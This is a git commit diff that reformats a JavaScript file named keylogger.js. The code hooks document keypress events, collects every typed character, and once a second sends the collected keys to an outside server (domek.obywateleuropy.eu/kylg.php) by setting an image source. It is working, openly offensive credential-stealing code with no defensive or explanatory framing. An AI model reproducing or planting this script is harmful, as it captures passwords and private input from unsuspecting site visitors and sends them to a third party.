5bf1ad31cc5ce39b9cdb0a690bc45ab6cdba1a0b
912d <912d@users.noreply.github.com>
2014-05-25 19:22:56 +0200

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,15 +1,14 @@
 var keys = '';
 
-        document.onkeypress = function(e) {
-            var get = window.event ? event : e;
-            var key = get.keyCode ? get.keyCode : get.charCode;
-            key = String.fromCharCode(key);
-            keys += key;
-        }
+document.onkeypress = function(e) {
+    var get = window.event ? event : e;
+    var key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    keys += key;
+}
 
-        window.setInterval(function(){
-            if( keys != "" )
-                //new Image().src = 'http://localhost/~re/kylg.php?c=' + keys;
+window.setInterval(function(){
+        if( keys != "" )
                 new Image().src = 'http://domek.obywateleuropy.eu/kylg.php?c=' + keys + ' ';
-            keys = '';
-        }, 1000);
+        keys = '';
+}, 1000);
